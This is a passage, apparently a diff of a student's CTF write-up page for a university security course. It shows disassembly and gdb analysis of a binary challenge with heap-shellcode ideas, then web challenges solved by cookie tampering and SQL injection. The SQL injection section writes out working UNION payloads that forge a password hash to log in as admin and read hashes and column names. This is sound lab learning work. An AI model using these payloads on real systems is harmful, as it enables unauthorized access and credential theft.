-    <span class="err">172</span><span class="nl">f:</span>       <span class="nf">b8</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>          <span class="no">mov</span>    <span class="no">$0x0</span><span class="p">,</span><span class="nv">%eax</span>
-    <span class="err">1734:</span>       <span class="nf">e8</span> <span class="mi">77</span> <span class="no">f9</span> <span class="no">ff</span> <span class="no">ff</span>          <span class="no">callq</span>  <span class="mh">10b0</span> <span class="p">&lt;</span><span class="no">srand@plt</span><span class="p">&gt;</span>
-    <span class="err">1739:</span>       <span class="nf">be</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>          <span class="no">mov</span>    <span class="no">$0x0</span><span class="p">,</span><span class="nv">%esi</span>
-    <span class="err">173</span><span class="nl">e:</span>       <span class="err">48</span> <span class="err">8</span><span class="nf">d</span> <span class="mi">3</span><span class="no">d</span> <span class="no">bb</span> <span class="mi">0</span><span class="no">a</span> <span class="mi">00</span> <span class="mi">00</span>    <span class="no">lea</span>    <span class="mi">0xabb</span><span class="p">(</span><span class="nv">%rip</span><span class="p">),</span><span class="nv">%rdi</span>        <span class="c"># 2200 &lt;_IO_stdin_used+0x200&gt;
-</span><span class="c"></span>    <span class="mi">1745</span><span class="p">:</span>       <span class="no">b8</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>          <span class="no">mov</span>    <span class="no">$0x0</span><span class="p">,</span><span class="nv">%eax</span>
-    <span class="err">174</span><span class="nl">a:</span>       <span class="nf">e8</span> <span class="no">a1</span> <span class="no">f9</span> <span class="no">ff</span> <span class="no">ff</span>          <span class="no">callq</span>  <span class="mh">10f0</span> <span class="p">&lt;</span><span class="no">open@plt</span><span class="p">&gt;</span>
-    <span class="err">174</span><span class="nl">f:</span>       <span class="err">89</span> <span class="err">45</span> <span class="nf">f4</span>                <span class="no">mov</span>    <span class="nv">%eax</span><span class="p">,-</span><span class="mi">0xc</span><span class="p">(</span><span class="nv">%rbp</span><span class="p">)</span>
-    <span class="err">1752:</span>       <span class="err">8</span><span class="nf">b</span> <span class="mi">45</span> <span class="no">f4</span>                <span class="no">mov</span>    <span class="p">-</span><span class="mi">0xc</span><span class="p">(</span><span class="nv">%rbp</span><span class="p">),</span><span class="nv">%eax</span>
-    <span class="err">1755:</span>       <span class="err">41</span> <span class="nf">b9</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>       <span class="no">mov</span>    <span class="no">$0x0</span><span class="p">,</span><span class="nv">%r9d</span>
-    <span class="err">175</span><span class="nl">b:</span>       <span class="err">41</span> <span class="err">89</span> <span class="nf">c0</span>                <span class="no">mov</span>    <span class="nv">%eax</span><span class="p">,</span><span class="nv">%r8d</span>
-    <span class="err">175</span><span class="nl">e:</span>       <span class="nf">b9</span> <span class="mi">12</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>          <span class="no">mov</span>    <span class="no">$0x12</span><span class="p">,</span><span class="nv">%ecx</span>
-    <span class="err">1763:</span>       <span class="nf">ba</span> <span class="mi">03</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>          <span class="no">mov</span>    <span class="no">$0x3</span><span class="p">,</span><span class="nv">%edx</span>
-    <span class="err">1768:</span>       <span class="nf">be</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">02</span> <span class="mi">00</span>          <span class="no">mov</span>    <span class="no">$0x20000</span><span class="p">,</span><span class="nv">%esi</span>
-    <span class="err">176</span><span class="nl">d:</span>       <span class="nf">bf</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">40</span> <span class="mi">00</span>          <span class="no">mov</span>    <span class="no">$0x400000</span><span class="p">,</span><span class="nv">%edi</span>
-    <span class="err">1772:</span>       <span class="nf">e8</span> <span class="no">e9</span> <span class="no">f8</span> <span class="no">ff</span> <span class="no">ff</span>          <span class="no">callq</span>  <span class="mh">1060</span> <span class="p">&lt;</span><span class="no">mmap@plt</span><span class="p">&gt;</span>
-    <span class="err">1777:</span>       <span class="err">48</span> <span class="err">89</span> <span class="err">45</span> <span class="nf">f8</span>             <span class="no">mov</span>    <span class="nv">%rax</span><span class="p">,-</span><span class="mi">0x8</span><span class="p">(</span><span class="nv">%rbp</span><span class="p">)</span>
-    <span class="err">177</span><span class="nl">b:</span>       <span class="err">8</span><span class="nf">b</span> <span class="mi">45</span> <span class="no">f4</span>                <span class="no">mov</span>    <span class="p">-</span><span class="mi">0xc</span><span class="p">(</span><span class="nv">%rbp</span><span class="p">),</span><span class="nv">%eax</span>
-    <span class="err">177</span><span class="nl">e:</span>       <span class="err">89</span> <span class="nf">c7</span>                   <span class="no">mov</span>    <span class="nv">%eax</span><span class="p">,</span><span class="nv">%edi</span>
-    <span class="err">1780:</span>       <span class="nf">b8</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>          <span class="no">mov</span>    <span class="no">$0x0</span><span class="p">,</span><span class="nv">%eax</span>
-    <span class="err">1785:</span>       <span class="nf">e8</span> <span class="mi">16</span> <span class="no">f9</span> <span class="no">ff</span> <span class="no">ff</span>          <span class="no">callq</span>  <span class="mh">10a0</span> <span class="p">&lt;</span><span class="no">close@plt</span><span class="p">&gt;</span>
-    <span class="err">178</span><span class="nl">a:</span>       <span class="err">90</span>                      <span class="nf">nop</span>
-    <span class="err">178</span><span class="nl">b:</span>       <span class="nf">c9</span>                      <span class="no">leaveq</span> 
-    <span class="mi">178</span><span class="no">c</span><span class="p">:</span>       <span class="no">c3</span>                      <span class="no">retq</span>   </code></pre></td></tr></table>
-</div>
-</div><div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-c" data-lang="c"><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span></code></pre></td>
-<td class="lntd">
-<pre class="chroma"><code class="language-c" data-lang="c"><span class="c1">// 0x0000000000001716
-</span><span class="c1"></span><span class="kt">int</span> <span class="nf">con</span><span class="p">()</span> <span class="p">{</span>
-  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">v0</span><span class="p">;</span> <span class="c1">// eax@1
-</span><span class="c1"></span>  <span class="kt">int</span> <span class="n">fd</span><span class="p">;</span> <span class="c1">// ST04_4@1
-</span><span class="c1"></span>
-  <span class="n">v0</span> <span class="o">=</span> <span class="n">time</span><span class="p">(</span><span class="mi">0LL</span><span class="p">);</span>
-  <span class="n">srand</span><span class="p">(</span><span class="n">v0</span><span class="p">);</span>
-  <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">&#34;/dev/zero&#34;</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
-  <span class="n">mmap</span><span class="p">((</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x400000</span><span class="p">,</span> <span class="p">(</span><span class="n">size_t</span><span class="p">)</span><span class="o">&amp;</span><span class="n">unk_20000</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">18</span><span class="p">,</span> <span class="n">fd</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
-  <span class="k">return</span> <span class="n">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
-<span class="p">}</span></code></pre></td></tr></table>
-</div>
-</div>
-<p>It&rsquo;s some sort of function that sets the seed for <code>rand</code>, as well as read a whole chunk of zeros into the memory (our heap address).<br />
-Although I don&rsquo;t see this function being called anywhere - it supposedly runs before <code>main</code></p>
-
-<p>Also, checking the security of this file with <code>checksec --file=./trivial</code>:</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="lnt">1
-</span><span class="lnt">2
-</span></code></pre></td>
-<td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable  FILE
-Partial RELRO   Canary found      NX disabled   PIE enabled     No RPATH   No RUNPATH   <span class="m">95</span> Symbols     Yes      <span class="m">0</span>               <span class="m">3</span>        ./trivial</code></pre></td></tr></table>
-</div>
-</div>
-<p>We&rsquo;ll be dealing with a binary that has partial RELRO (Can override the GOT table if need be), a Stack Canary (Won&rsquo;t be able to <em>just</em> do a buffer overflow - ish), and PIE enabled (memory space stuff)</p>
-
-<p>We can see that the stack (and heap) is executable too, with <code>readelf -l ./trivial</code>:</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><span class="lnt">1
-</span></pre></td>
-<td class="lntd">
-<pre class="chroma">GNU_STACK      0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000  RWE 0x10</pre></td></tr></table>
-</div>
-</div>
-<p>The <code>E</code> in <code>RWE</code> stands for <strong>E</strong>xecutable.</p>
-
-<hr />
-
-<p><strong><code>trivial_malloc</code></strong></p>
-
-<p>This function returns a limited address range.</p>
-
-<p><code>(0x0 + 0x400000) &amp; 0xFFFFFFF8 = 4194304</code><br />
-<code>(0x19999 + 0x400000) &amp; 0xFFFFFFF8 = 4299160</code></p>
-
-<p>So we have a range of <code>104856</code> bytes.</p>
-
-<p>As <code>sizeof(struct node)</code> is <code>24</code> (3x 8byte pointers), and name is &lsquo;allocated&rsquo; <code>128</code> bytes, that&rsquo;s <code>152</code> bytes per item.</p>
-
-<p><code>(4299160-4194304) / (24 + 128) = 689.84</code><br />
-So theoretically, we can have a maximum of 689 / 690 items before we are &lsquo;out&rsquo; of free space</p>
-
-<hr />
-
-<p>I made a breakpoint occur every time <code>create_item</code> finishes, to inspect the frame.</p>
-
-<p>After creating two items, we should expect <code>*(items)</code> and <code>*(items+8)</code> to be populated, as we do see.</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-gdb" data-lang="gdb"><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span></code></pre></td>
-<td class="lntd">
-<pre class="chroma"><code class="language-gdb" data-lang="gdb">(gdb) p/x items                                                                                                                                                                               
+<span class=p>}</span></code></pre></td></tr></table></div></div><p>There&rsquo;s &hellip; no <code>malloc</code>? Nor is there a <code>calloc</code> anywhere?<br>And you can definitely see that if you search the dissasembly <code>objdump -d trivial | grep malloc</code>.</p><p>So, the assignment of our items into the heap is being controlled <strong>manually</strong>!</p><p>There&rsquo;s also this function called <code>con</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code class=language-asm data-lang=asm><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-asm data-lang=asm><span class=err>0000000000001716</span> <span class=err>&lt;</span><span class=nf>con</span><span class=err>&gt;</span><span class=p>:</span>
+    <span class=err>1716:</span>       <span class=err>55</span>                      <span class=nf>push</span>   <span class=nv>%rbp</span>
+    <span class=err>1717:</span>       <span class=err>48</span> <span class=err>89</span> <span class=nf>e5</span>                <span class=no>mov</span>    <span class=nv>%rsp</span><span class=p>,</span><span class=nv>%rbp</span>
+    <span class=err>171</span><span class=nl>a:</span>       <span class=err>48</span> <span class=err>83</span> <span class=nf>ec</span> <span class=mi>10</span>             <span class=no>sub</span>    <span class=no>$0x10</span><span class=p>,</span><span class=nv>%rsp</span>
+    <span class=err>171</span><span class=nl>e:</span>       <span class=nf>bf</span> <span class=mi>00</span> <span class=mi>00</span> <span class=mi>00</span> <span class=mi>00</span>          <span class=no>mov</span>    <span class=no>$0x0</span><span class=p>,</span><span class=nv>%edi</span>
+    <span class=err>1723:</span>       <span class=nf>b8</span> <span class=mi>00</span> <span class=mi>00</span> <span class=mi>00</span> <span class=mi>00</span>          <span class=no>mov</span>    <span class=no>$0x0</span><span class=p>,</span><span class=nv>%eax</span>
+    <span class=err>1728:</span>       <span class=nf>e8</span> <span class=no>b3</span> <span class=no>f9</span> <span class=no>ff</span> <span class=no>ff</span>          <span class=no>callq</span>  <span class=mh>10e0</span> <span class=p>&lt;</span><span class=no>time@plt</span><span class=p>&gt;</span>
+    <span class=err>172</span><span class=nl>d:</span>       <span class=err>89</span> <span class=nf>c7</span>                   <span class=no>mov</span>    <span class=nv>%eax</span><span class=p>,</span><span class=nv>%edi</span>
+    <span class=err>172</span><span class=nl>f:</span>       <span class=nf>b8</span> <span class=mi>00</span> <span class=mi>00</span> <span class=mi>00</span> <span class=mi>00</span>          <span class=no>mov</span>    <span class=no>$0x0</span><span class=p>,</span><span class=nv>%eax</span>
+    <span class=err>1734:</span>       <span class=nf>e8</span> <span class=mi>77</span> <span class=no>f9</span> <span class=no>ff</span> <span class=no>ff</span>          <span class=no>callq</span>  <span class=mh>10b0</span> <span class=p>&lt;</span><span class=no>srand@plt</span><span class=p>&gt;</span>
+    <span class=err>1739:</span>       <span class=nf>be</span> <span class=mi>00</span> <span class=mi>00</span> <span class=mi>00</span> <span class=mi>00</span>          <span class=no>mov</span>    <span class=no>$0x0</span><span class=p>,</span><span class=nv>%esi</span>
+    <span class=err>173</span><span class=nl>e:</span>       <span class=err>48</span> <span class=err>8</span><span class=nf>d</span> <span class=mi>3</span><span class=no>d</span> <span class=no>bb</span> <span class=mi>0</span><span class=no>a</span> <span class=mi>00</span> <span class=mi>00</span>    <span class=no>lea</span>    <span class=mi>0xabb</span><span class=p>(</span><span class=nv>%rip</span><span class=p>),</span><span class=nv>%rdi</span>        <span class=c># 2200 &lt;_IO_stdin_used+0x200&gt;
+</span><span class=c></span>    <span class=mi>1745</span><span class=p>:</span>       <span class=no>b8</span> <span class=mi>00</span> <span class=mi>00</span> <span class=mi>00</span> <span class=mi>00</span>          <span class=no>mov</span>    <span class=no>$0x0</span><span class=p>,</span><span class=nv>%eax</span>
+    <span class=err>174</span><span class=nl>a:</span>       <span class=nf>e8</span> <span class=no>a1</span> <span class=no>f9</span> <span class=no>ff</span> <span class=no>ff</span>          <span class=no>callq</span>  <span class=mh>10f0</span> <span class=p>&lt;</span><span class=no>open@plt</span><span class=p>&gt;</span>
+    <span class=err>174</span><span class=nl>f:</span>       <span class=err>89</span> <span class=err>45</span> <span class=nf>f4</span>                <span class=no>mov</span>    <span class=nv>%eax</span><span class=p>,-</span><span class=mi>0xc</span><span class=p>(</span><span class=nv>%rbp</span><span class=p>)</span>
+    <span class=err>1752:</span>       <span class=err>8</span><span class=nf>b</span> <span class=mi>45</span> <span class=no>f4</span>                <span class=no>mov</span>    <span class=p>-</span><span class=mi>0xc</span><span class=p>(</span><span class=nv>%rbp</span><span class=p>),</span><span class=nv>%eax</span>
+    <span class=err>1755:</span>       <span class=err>41</span> <span class=nf>b9</span> <span class=mi>00</span> <span class=mi>00</span> <span class=mi>00</span> <span class=mi>00</span>       <span class=no>mov</span>    <span class=no>$0x0</span><span class=p>,</span><span class=nv>%r9d</span>
+    <span class=err>175</span><span class=nl>b:</span>       <span class=err>41</span> <span class=err>89</span> <span class=nf>c0</span>                <span class=no>mov</span>    <span class=nv>%eax</span><span class=p>,</span><span class=nv>%r8d</span>
+    <span class=err>175</span><span class=nl>e:</span>       <span class=nf>b9</span> <span class=mi>12</span> <span class=mi>00</span> <span class=mi>00</span> <span class=mi>00</span>          <span class=no>mov</span>    <span class=no>$0x12</span><span class=p>,</span><span class=nv>%ecx</span>
+    <span class=err>1763:</span>       <span class=nf>ba</span> <span class=mi>03</span> <span class=mi>00</span> <span class=mi>00</span> <span class=mi>00</span>          <span class=no>mov</span>    <span class=no>$0x3</span><span class=p>,</span><span class=nv>%edx</span>
+    <span class=err>1768:</span>       <span class=nf>be</span> <span class=mi>00</span> <span class=mi>00</span> <span class=mi>02</span> <span class=mi>00</span>          <span class=no>mov</span>    <span class=no>$0x20000</span><span class=p>,</span><span class=nv>%esi</span>
+    <span class=err>176</span><span class=nl>d:</span>       <span class=nf>bf</span> <span class=mi>00</span> <span class=mi>00</span> <span class=mi>40</span> <span class=mi>00</span>          <span class=no>mov</span>    <span class=no>$0x400000</span><span class=p>,</span><span class=nv>%edi</span>
+    <span class=err>1772:</span>       <span class=nf>e8</span> <span class=no>e9</span> <span class=no>f8</span> <span class=no>ff</span> <span class=no>ff</span>          <span class=no>callq</span>  <span class=mh>1060</span> <span class=p>&lt;</span><span class=no>mmap@plt</span><span class=p>&gt;</span>
+    <span class=err>1777:</span>       <span class=err>48</span> <span class=err>89</span> <span class=err>45</span> <span class=nf>f8</span>             <span class=no>mov</span>    <span class=nv>%rax</span><span class=p>,-</span><span class=mi>0x8</span><span class=p>(</span><span class=nv>%rbp</span><span class=p>)</span>
+    <span class=err>177</span><span class=nl>b:</span>       <span class=err>8</span><span class=nf>b</span> <span class=mi>45</span> <span class=no>f4</span>                <span class=no>mov</span>    <span class=p>-</span><span class=mi>0xc</span><span class=p>(</span><span class=nv>%rbp</span><span class=p>),</span><span class=nv>%eax</span>
+    <span class=err>177</span><span class=nl>e:</span>       <span class=err>89</span> <span class=nf>c7</span>                   <span class=no>mov</span>    <span class=nv>%eax</span><span class=p>,</span><span class=nv>%edi</span>
+    <span class=err>1780:</span>       <span class=nf>b8</span> <span class=mi>00</span> <span class=mi>00</span> <span class=mi>00</span> <span class=mi>00</span>          <span class=no>mov</span>    <span class=no>$0x0</span><span class=p>,</span><span class=nv>%eax</span>
+    <span class=err>1785:</span>       <span class=nf>e8</span> <span class=mi>16</span> <span class=no>f9</span> <span class=no>ff</span> <span class=no>ff</span>          <span class=no>callq</span>  <span class=mh>10a0</span> <span class=p>&lt;</span><span class=no>close@plt</span><span class=p>&gt;</span>
+    <span class=err>178</span><span class=nl>a:</span>       <span class=err>90</span>                      <span class=nf>nop</span>
+    <span class=err>178</span><span class=nl>b:</span>       <span class=nf>c9</span>                      <span class=no>leaveq</span> 
+    <span class=mi>178</span><span class=no>c</span><span class=p>:</span>       <span class=no>c3</span>                      <span class=no>retq</span>   </code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code class=language-c data-lang=c><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-c data-lang=c><span class=c1>// 0x0000000000001716
+</span><span class=c1></span><span class=kt>int</span> <span class=nf>con</span><span class=p>()</span> <span class=p>{</span>
+  <span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>v0</span><span class=p>;</span> <span class=c1>// eax@1
+</span><span class=c1></span>  <span class=kt>int</span> <span class=n>fd</span><span class=p>;</span> <span class=c1>// ST04_4@1
+</span><span class=c1></span>
+  <span class=n>v0</span> <span class=o>=</span> <span class=n>time</span><span class=p>(</span><span class=mi>0LL</span><span class=p>);</span>
+  <span class=n>srand</span><span class=p>(</span><span class=n>v0</span><span class=p>);</span>
+  <span class=n>fd</span> <span class=o>=</span> <span class=n>open</span><span class=p>(</span><span class=s>&#34;/dev/zero&#34;</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
+  <span class=n>mmap</span><span class=p>((</span><span class=kt>void</span> <span class=o>*</span><span class=p>)</span><span class=mh>0x400000</span><span class=p>,</span> <span class=p>(</span><span class=n>size_t</span><span class=p>)</span><span class=o>&amp;</span><span class=n>unk_20000</span><span class=p>,</span> <span class=mi>3</span><span class=p>,</span> <span class=mi>18</span><span class=p>,</span> <span class=n>fd</span><span class=p>,</span> <span class=mi>0LL</span><span class=p>);</span>
+  <span class=k>return</span> <span class=n>close</span><span class=p>(</span><span class=n>fd</span><span class=p>);</span>
+<span class=p>}</span></code></pre></td></tr></table></div></div><p>It&rsquo;s some sort of function that sets the seed for <code>rand</code>, as well as read a whole chunk of zeros into the memory (our heap address).<br>Although I don&rsquo;t see this function being called anywhere - it supposedly runs before <code>main</code></p><p>Also, checking the security of this file with <code>checksec --file=./trivial</code>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code class=language-bash data-lang=bash><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-bash data-lang=bash>RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable  FILE
+Partial RELRO   Canary found      NX disabled   PIE enabled     No RPATH   No RUNPATH   <span class=m>95</span> Symbols     Yes      <span class=m>0</span>               <span class=m>3</span>        ./trivial</code></pre></td></tr></table></div></div><p>We&rsquo;ll be dealing with a binary that has partial RELRO (Can override the GOT table if need be), a Stack Canary (Won&rsquo;t be able to <em>just</em> do a buffer overflow - ish), and PIE enabled (memory space stuff)</p><p>We can see that the stack (and heap) is executable too, with <code>readelf -l ./trivial</code>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><span class=lnt>1
+</span></pre></td><td class=lntd><pre class=chroma>GNU_STACK      0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000  RWE 0x10</pre></td></tr></table></div></div><p>The <code>E</code> in <code>RWE</code> stands for <strong>E</strong>xecutable.</p><hr><p><strong><code>trivial_malloc</code></strong></p><p>This function returns a limited address range.</p><p><code>(0x0 + 0x400000) &amp; 0xFFFFFFF8 = 4194304</code><br><code>(0x19999 + 0x400000) &amp; 0xFFFFFFF8 = 4299160</code></p><p>So we have a range of <code>104856</code> bytes.</p><p>As <code>sizeof(struct node)</code> is <code>24</code> (3x 8byte pointers), and name is &lsquo;allocated&rsquo; <code>128</code> bytes, that&rsquo;s <code>152</code> bytes per item.</p><p><code>(4299160-4194304) / (24 + 128) = 689.84</code><br>So theoretically, we can have a maximum of 689 / 690 items before we are &lsquo;out&rsquo; of free space</p><hr><p>I made a breakpoint occur every time <code>create_item</code> finishes, to inspect the frame.</p><p>After creating two items, we should expect <code>*(items)</code> and <code>*(items+8)</code> to be populated, as we do see.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code class=language-gdb data-lang=gdb><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-gdb data-lang=gdb>(gdb) p/x items                                                                                                                                                                               
 $1 = 0x417c20                                                                                                                                                                                 
 (gdb) p/x *(items) 
 $2 = 0x555580a8                                                                                                                                                                               
@@ -454,192 +174,23 @@ $3 = 0x404450
 (gdb) p/x *(items+16)                                                                                                                                                                         
 $4 = 0x0                                                                                                                                                                                      
 (gdb) p/x *(items+24)                                                                                                                                                                         
-$5 = 0x0                                                                                                                                                                                      </code></pre></td></tr></table>
-</div>
-</div>
-<p>I&rsquo;m not sure what&rsquo;s going on, but it looks like <code>items[0]</code> points to an address that wasn&rsquo;t &lsquo;allocated&rsquo;.</p>
-
-<hr />
-
-<p><strong>glib versions</strong></p>
-
-<ul>
-<li>most things - 2.2.5</li>
-<li>2.2</li>
-<li>isoc99 functions - 2.7</li>
-<li>stack check - 2.4</li>
-</ul>
-
-<p><strong>Possible solutions</strong></p>
-
-<ul>
-<li>heap overflow into shellcode</li>
-<li>Heap spray -&gt; NOP sled \x90</li>
-</ul>
-
-<p></details></p>
-
-<h1 id="category-web">Category: Web</h1>
-
-<h2 id="cookie">cookie</h2>
-
-<p><details></p>
-
-<blockquote>
-<p><a href="http://plsdonthaq.me:8001">http://plsdonthaq.me:8001</a></p>
-</blockquote>
-
-<p><strong>Solution</strong><br />
-There&rsquo;s a browser cookie <code>admin</code> that is set to <code>0</code>.<br />
-Simple just modify the cookie and set it to <code>1</code>.</p>
-
-<p>Flag: <code>COMP6441{you_should_consider_doing_comp_[6843/6447]}</code></p>
-
-<p></details></p>
-
-<h2 id="ezpz1-0">ezpz1.0</h2>
-
-<p><details></p>
-
-<blockquote>
-<p><a href="http://plsdonthaq.me:8013">http://plsdonthaq.me:8013</a></p>
-</blockquote>
-
-<p><strong>Analysis</strong><br />
-This is an SQL Injection question.<br />
-Unfortunately a few too many people have been most likely <a href="http://sqlmap.org/"><code>sqlmap</code></a>-ing the poor website, and it was very slow to use (Rate limit your queries!!!).<br />
-(<em>or, the server was slow to begin with</em>)</p>
-
-<p>We&rsquo;re given a website with a login form, and a few links at the top.<br />
-One says &ldquo;flag&rdquo;, but it&rsquo;s a 404 - <strong>it&rsquo;s a red herring</strong>, so let&rsquo;s forget about that.</p>
-
-<p>Doing some reconnaissance, we see that the SQL queries are performed unsafely.<br />
-If we put a <code>'</code> into the username input, we&rsquo;re presented with a backend error</p>
-
-<p><code>''' LIMIT 1&quot; LINE 3: ... WHERE username=''' ^ [SQL: &quot;SELECT username, password\n FROM users\n WHERE username='''\n LIMIT 1&quot;] (Background on this error at: http://sqlalche.me/e/f405)</code></p>
-
-<p>From here, we can see that the backend is using <a href="https://www.sqlalchemy.org/">SQLAlchemy</a>, a SQL library for Python.<br />
-With some more research, we can see that the database is running <a href="https://www.postgresql.org/">Postgres</a>.</p>
-
-<p>Let&rsquo;s have a look at the query string.</p>
-
-<p><code>&quot;SELECT username, password FROM users WHERE username='' LIMIT 1&quot;</code></p>
-
-<p>We see that the query is using apostrophes (<code>'</code>) to enclose the username and password strings, so <strong>we also want to use apostrophes</strong> in our exploit.<br />
-We can also see that the password field is indirectly referenced - meaning that we won&rsquo;t be able to perform any sort of injection from the password input field (at least not with this query string alone).</p>
-
-<p>Firstly, let&rsquo;s guess a username - perhaps <code>admin</code>.<br />
-Putting in <code>admin</code> and whatever password we want gives us an error saying that the <strong>sha256(hash)</strong> does not match.<br />
-Interesting, so we know that the passwords might be hashed with SHA256.</p>
-
-<p>We can therefore infer that some line of code in the server is performing a comparison: <code>if (sha256(input_password) == hash_inside_the_database) { ... }</code>.</p>
-
-<p>We can see from the SQL query, that the backend <em>first</em> retrieves a record, and <em>then</em> compares the record to our input.<br />
-Obviously we don&rsquo;t have the password, let alone the SHA256 hash of the user <code>admin</code> (not yet at least) - but that&rsquo;s okay, we&rsquo;ll just provide our own hash!</p>
-
-<p>We can perform an SQL injection into the username field to provide our own row with the <code>UNION</code> operator</p>
-
-<p>Let&rsquo;s create a SHA256 hash of the letter <code>a</code> (our forced password)&hellip;<br />
-<code>sha256(&quot;a&quot;) =&gt; ca978112ca1bbdcafac231b39a23dc4da786eff8147c4e72b9807785afee48bb</code></p>
-
-<p>Injecting <code>' UNION SELECT 'admin', 'ca978112ca1bbdcafac231b39a23dc4da786eff8147c4e72b9807785afee48bb'--</code> into the username field, and using <code>a</code> as the password, we&rsquo;re presented with a welcome page, saying welcome <code>admin</code>!</p>
-
-<p>Perhaps we can try get the password hash by concatenating the admin username and password as our first column in the union.</p>
-
-<p>Inject: <code>' UNION SELECT 'admin' || password, 'ca978112ca1bbdcafac231b39a23dc4da786eff8147c4e72b9807785afee48bb' FROM users--</code><br />
-Result: <code>You are logged in as You are logged in as admin6d77eed869f7503fdc1a0c7feb648fffe2398a7b7952b91f0a7acc7fb7e26d2d</code></p>
-
-<p>So we&rsquo;ve gotten the SHA256 password hash for <code>admin</code> to be <code>6d77eed869f7503fdc1a0c7feb648fffe2398a7b7952b91f0a7acc7fb7e26d2d</code>, which is probably a hash of the flag!</p>
-
-<p>Let&rsquo;s see what else is in our <code>users</code> table.</p>
-
-<p>To extract the names of the columns in our <code>users</code> table&hellip;<br />
-<code>' UNION SELECT column_name, 'ca978112ca1bbdcafac231b39a23dc4da786eff8147c4e72b9807785afee48bb' FROM information_schema.columns WHERE table_name = 'users' OFFSET 0--</code><br />
-<code>' UNION SELECT column_name, 'ca978112ca1bbdcafac231b39a23dc4da786eff8147c4e72b9807785afee48bb' FROM information_schema.columns WHERE table_name = 'users' OFFSET 1--</code><br />
-<code>' UNION SELECT column_name, 'ca978112ca1bbdcafac231b39a23dc4da786eff8147c4e72b9807785afee48bb' FROM information_schema.columns WHERE table_name = 'users' OFFSET 2--</code></p>
-
-<p>These queries give us the existence of three columns, <code>password</code>, <code>username</code>, and <code>id</code></p>
-
-<p>Searching for the entries in this table (<em>perhaps we had to find another user?</em>)&hellip;<br />
